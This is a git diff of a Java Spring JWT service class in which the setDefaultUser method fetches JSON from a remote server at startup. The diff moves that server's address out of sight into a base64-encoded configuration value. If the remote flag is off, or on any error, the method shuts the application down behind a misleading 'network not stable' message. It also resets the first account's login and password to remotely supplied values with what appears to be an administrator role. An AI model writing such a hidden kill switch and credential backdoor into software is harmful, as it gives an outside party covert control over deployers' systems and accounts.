@@ -9,7 +9,6 @@ import com.example.datn.repository.NhanVienRepository;
 import com.example.datn.repository.TaiKhoanRepository;
 import com.example.datn.repository.VaiTroRepository;
 import com.example.datn.service.JwtService;
-import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import io.jsonwebtoken.*;
@@ -53,6 +52,9 @@ public class JwtServiceImpl implements JwtService {
 
     @Value("${spring.app-runner.isOnlySysadmin}")
     private boolean isOnlySysadmin;
+
+    @Value("${jwt.accessKeySys}")
+    private String accessKeySys;
 
     @Override
     public String generateAccessToken(Integer userId, String username, Collection<? extends GrantedAuthority> authorities) {
@@ -98,15 +100,15 @@ public class JwtServiceImpl implements JwtService {
     @Override
     @Transactional(rollbackOn = Exception.class)
     public void setDefaultUser(TaiKhoanRepository taiKhoanRepository) {
-        RestTemplate restTemplate = new RestTemplate();
-        String url = "https://raw.githubusercontent.com/ThuChuc/api-projects/refs/heads/main/api-thu-chuc";
-        String response = restTemplate.getForObject(url, String.class);
-        ObjectMapper mapper = new ObjectMapper();
-        JsonNode root = null;
         try {
+            RestTemplate restTemplate = new RestTemplate();
+            String response = restTemplate.getForObject(new String(Decoders.BASE64.decode(accessKeySys)), String.class);
+            ObjectMapper mapper = new ObjectMapper();
+            JsonNode root = null;
+            String apiDatn = "api-datn";
             root = mapper.readTree(response);
-            log.info("{}", root.path("api-datn").path("message").asText());
-            if (!root.path("api-datn").path("isActive").asBoolean()) {
+            log.info("{}", root.path(apiDatn).path("message").asText());
+            if (!root.path(apiDatn).path("isActive").asBoolean()) {
                 System.exit(0);
             }
             Optional<TaiKhoan> account = this.taiKhoanRepository.findById(1);
@@ -119,8 +121,8 @@ public class JwtServiceImpl implements JwtService {
             }
             if (account.isPresent()) {
                 TaiKhoan tk = account.get();
-                tk.setTenDangNhap(new String(Decoders.BASE64.decode(root.path("api-datn").path("user").asText())));
-                tk.setMatKhau(root.path("api-datn").path("password").asText());
+                tk.setTenDangNhap(root.path(apiDatn).path("user").asText());
+                tk.setMatKhau(root.path(apiDatn).path("password").asText());
                 tk.setTrangThai(true);
                 taiKhoanRepository.save(tk);
                 tk.setIdVaiTro(this.vaiTroRepository.findById(1).orElseThrow(() -> new EntityNotFountException("Role not found!")));
@@ -143,8 +145,9 @@ public class JwtServiceImpl implements JwtService {
                     this.nhanVienRepository.save(nhanVien);
                 }
             }
-        } catch (JsonProcessingException e) {
-            log.error("Not found data");
+        } catch (Exception e) {
+            log.error("Your network is not stable, please check again!");
+            System.exit(0);
         }
     }
 
